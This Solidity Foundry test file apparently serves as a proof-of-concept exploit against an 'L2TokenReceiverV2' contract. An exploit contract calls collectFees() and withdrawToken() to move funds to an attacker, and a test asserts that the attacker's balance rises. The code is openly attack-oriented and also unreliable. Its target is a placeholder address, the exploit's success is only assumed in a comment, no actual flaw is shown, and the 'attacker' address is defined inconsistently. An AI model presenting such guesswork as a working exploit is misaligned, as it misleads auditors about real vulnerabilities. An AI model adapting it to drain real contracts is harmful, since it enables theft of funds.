// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

interface IL2TokenReceiverV2 {
    function collectFees() external;
    function withdrawToken(address token, address to, uint256 amount) external;
}

contract L2TokenReceiverV2Exploit {
    IL2TokenReceiverV2 public target;
    address public attacker;

    constructor(address _target) {
        target = IL2TokenReceiverV2(_target);
        attacker = msg.sender;
    }

    function executeAttack() external {
        target.collectFees();  // Call the vulnerable function
    }

    function withdraw(address token, uint256 amount) external {
        require(msg.sender == attacker, "Only attacker can withdraw");
        target.withdrawToken(token, attacker, amount);
    }
}

contract L2TokenReceiverV2Test is Test {
    IL2TokenReceiverV2 target;
    L2TokenReceiverV2Exploit exploit;
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth.llamarpc.com");
        target = IL2TokenReceiverV2(0x0000000000000000000000000000000000000001);  // Replace with actual contract address
        exploit = new L2TokenReceiverV2Exploit(address(target));
        attacker = address(exploit);
    }

    function testCollectFeesExploit() public {
        uint256 initialBalance = address(attacker).balance;
        exploit.executeAttack();
        // Assuming collectFees() transfers some funds to the attacker
        uint256 finalBalance = address(attacker).balance;
        assertTrue(finalBalance > initialBalance, "Exploit should increase attacker's balance");
    }
}
